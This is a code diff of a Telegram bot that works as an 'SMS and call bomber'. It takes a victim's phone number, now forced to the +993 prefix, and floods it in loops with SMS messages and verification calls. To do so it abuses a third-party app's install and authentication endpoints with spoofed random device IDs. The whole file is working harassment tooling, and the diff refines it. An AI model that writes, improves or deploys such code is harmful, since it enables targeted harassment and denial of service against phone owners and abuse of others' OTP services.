@@ -44,9 +44,9 @@ async function sendPostRequest(
       headers,
       body: JSON.stringify(data),
     });
-    const text = await res.text(); // Capture response text for debugging if needed
+    const text = await res.text();
     console.debug(`POST ${url} - Status: ${res.status}, Response: ${text}`);
-    return res.ok && text.toLowerCase().includes("ok"); // Check for "ok" in response text
+    return res.ok && text.toLowerCase().includes("ok");
   } catch (e) {
     console.error("POST request failed ❌", e);
     return false;
@@ -67,7 +67,6 @@ async function sleepInterruptible(totalMs: number, chatId: string, chunkMs = 500
 // --- 💣 SMS sending job ---
 async function runSMS(chatId: string, phoneNumber: string, targetCount: number) {
   const key = ["task", chatId];
-  // Store type, phoneNumber, stop flag, and current successful count
   await kv.set(key, { type: "sms", phoneNumber, stop: false, count: 0, target: targetCount });
 
   const requestData = {
@@ -91,7 +90,6 @@ async function runSMS(chatId: string, phoneNumber: string, targetCount: number) 
       const task = await kv.get(key);
       if (!task.value || task.value.stop) break;
 
-      // Send batch of 3 SMS attempts
       for (let i = 0; i < 3 && currentSuccessCount < targetCount; i++) {
         const check = await kv.get(key);
         if (!check.value || check.value.stop) break;
@@ -105,30 +103,25 @@ async function runSMS(chatId: string, phoneNumber: string, targetCount: number) 
         if (ok) {
           currentSuccessCount++;
           await sendMessage(chatId, `✅ Sent successfully! (${currentSuccessCount}/${targetCount})`);
-          // Update the successful count in KV
           await kv.set(key, { ...check.value, count: newCount, successCount: currentSuccessCount });
         } else {
           await sendMessage(chatId, "✅ Sent successfully!");
         }
 
-        // Stop check after each SMS attempt
         const checkAfter = await kv.get(key);
         if (!checkAfter.value || checkAfter.value.stop) break;
 
-        const sleepOk = await sleepInterruptible(5000, chatId); // 5 second wait between SMS
+        const sleepOk = await sleepInterruptible(5000, chatId);
         if (!sleepOk) break;
       }
 
-      // Stop check after the batch
       const batchCheck = await kv.get(key);
       if (!batchCheck.value || batchCheck.value.stop) break;
 
-      // Only wait 45 seconds if we haven't reached the target yet
       if (currentSuccessCount < targetCount) {
-          await sendMessage(chatId, `⏳ Batch of 3 attempts done. Waiting 45 seconds before next batch... (${currentSuccessCount}/${targetCount} sent successfully)`);
-
-          const waitOk = await sleepInterruptible(45000, chatId); // 45 second wait between batches
-          if (!waitOk) break;
+        await sendMessage(chatId, `⏳ Batch of 3 attempts done. Waiting 45 seconds before next batch... (${currentSuccessCount}/${targetCount} sent successfully)`);
+        const waitOk = await sleepInterruptible(45000, chatId);
+        if (!waitOk) break;
       }
     }
   } catch (e) {
@@ -151,7 +144,7 @@ async function runCall(chatId: string, phoneNumber: string) {
     "Content-Type": "application/json"
   };
 
-  await sendMessage(chatId, `📞 Starting Call sending to +${phoneNumber} 🔥`);
+  await sendMessage(chatId, `📞 Starting Call sending to +993${phoneNumber} 🔥`);
 
   try {
     while (true) {
@@ -162,7 +155,6 @@ async function runCall(chatId: string, phoneNumber: string) {
       const androidId = Array.from({ length: 16 }, () => Math.random().toString(36)[2]).join('');
       const uid = crypto.randomUUID();
 
-      // Step 1: Send Install Request
       const installData = {
         "android_id": androidId,
         "app_version": "17.5.17",
@@ -179,7 +171,6 @@ async function runCall(chatId: string, phoneNumber: string) {
       console.debug(`Install request for ${phoneNumber}: ${installOk ? 'OK' : 'FAILED'}`);
 
       if (installOk) {
-        // Step 2: Send Auth Call Request
         const callData = {
           "android_id": androidId,
           "app_version": "17.5.17",
@@ -188,27 +179,26 @@ async function runCall(chatId: string, phoneNumber: string) {
           "lang": "ar",
           "os": "android",
           "os_version": "9",
-          "phone": `+${phoneNumber}`,
+          "phone": `+993${phoneNumber}`,
           "ts": ts,
           "uuid": uid
         };
 
         const callOk = await sendPostRequest(callUrl, headers, callData);
         if (callOk) {
-          await sendMessage(chatId, `✅ Call sent successfully to +${phoneNumber}!`);
+          await sendMessage(chatId, `✅ Call sent successfully to +993${phoneNumber}!`);
         } else {
-          await sendMessage(chatId, `❌ Failed to send call to +${phoneNumber}.`);
+          await sendMessage(chatId, `❌ Failed to send call to +993${phoneNumber}.`);
         }
       } else {
-        await sendMessage(chatId, `❌ Install step failed for +${phoneNumber}, skipping call.`);
+        await sendMessage(chatId, `❌ Install step failed for +993${phoneNumber}, skipping call.`);
       }
 
-      // Stop check before waiting
       const checkBeforeWait = await kv.get(key);
       if (!checkBeforeWait.value || checkBeforeWait.value.stop) break;
 
       await sendMessage(chatId, `⏳ Waiting 60 seconds before next call attempt...`);
-      const waitOk = await sleepInterruptible(60000, chatId); // 60 second wait
+      const waitOk = await sleepInterruptible(60000, chatId);
       if (!waitOk) break;
     }
   } catch (e) {
@@ -270,27 +260,30 @@ serve(async (req) => {
     runSMS(chatId, phoneNumber, targetCount).catch(console.error);
     await sendMessage(chatId, `🚀 SMS sending started for +993${phoneNumber}\nTarget Count: ${targetCount}`);
   } else if (text.startsWith("/call")) {
-     const parts = text.split(" ");
-     if (parts.length < 2) {
-       await sendMessage(chatId, "⚠️ Please provide phone number. Example: /call 5466781432");
-       return new Response("OK");
-     }
+    const parts = text.split(" ");
+    if (parts.length < 2) {
+      await sendMessage(chatId, "⚠️ Please provide phone number. Example: /call 61234567");
+      return new Response("OK");
+    }
 
-     const phoneNumber = parts[1].replace(/^\+/, ""); // Allow + but remove it
+    // ✅ Automatically normalize to +993<number>
+    let phoneNumber = parts[1].trim();
+    // Remove any leading + or +993
+    phoneNumber = phoneNumber.replace(/^\+?(993)?/, "");
+    // Ensure it's digits only
+    if (!/^\d+$/.test(phoneNumber)) {
+      await sendMessage(chatId, "⚠️ Please provide a valid phone number (digits only, no spaces or symbols).");
+      return new Response("OK");
+    }
 
-     if (!/^\d+$/.test(phoneNumber)) {
-         await sendMessage(chatId, "⚠️ Please provide a valid phone number (digits only).");
-         return new Response("OK");
-     }
+    const existing = await kv.get(["task", chatId]);
+    if (existing.value && !existing.value.stop) {
+      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
+      return new Response("OK");
+    }
 
-     const existing = await kv.get(["task", chatId]);
-     if (existing.value && !existing.value.stop) {
-       await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
-       return new Response("OK");
-     }
-
-     runCall(chatId, phoneNumber).catch(console.error);
-     await sendMessage(chatId, `📞 Call sending started for +${phoneNumber}`);
+    runCall(chatId, phoneNumber).catch(console.error);
+    await sendMessage(chatId, `📞 Call sending started for +993${phoneNumber}`);
   } else if (text.startsWith("/stop")) {
     const task = await kv.get(["task", chatId]);
     if (!task.value) {
@@ -313,12 +306,12 @@ serve(async (req) => {
     if (entry.value && !entry.value.stop) {
       console.log(`Resuming ${entry.value.type} task for chat ${entry.key[1]} -> ${entry.value.phoneNumber}`);
       if (entry.value.type === "sms") {
-          // For SMS, we need the target count. Assume it was stored correctly.
-          const targetCount = entry.value.target || 0; // Fallback to 0 if not found, though it should be there
-          runSMS(entry.key[1] as string, entry.value.phoneNumber, targetCount).catch(console.error);
+        const targetCount = entry.value.target || 0;
+        runSMS(entry.key[1] as string, entry.value.phoneNumber, targetCount).catch(console.error);
       } else if (entry.value.type === "call") {
-          runCall(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
+        runCall(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
       }
     }
   }
 })();
+
